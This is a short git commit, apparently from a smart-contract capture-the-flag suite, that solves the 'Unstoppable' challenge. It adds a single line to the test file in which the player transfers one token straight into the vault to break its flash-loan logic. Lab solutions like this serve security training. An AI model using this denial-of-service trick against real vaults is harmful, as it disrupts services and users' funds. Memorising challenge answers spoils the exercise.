d8ed0c7269c2c77cff49d1afdc619dec8e661af1
shaka <miriam.shaka@eganet.go.tz>
2024-06-11 09:37:36 +0300

    solved unstoppable

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -45,6 +45,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).transfer(vault.address, 1);
+
     });
 
     after(async function () {
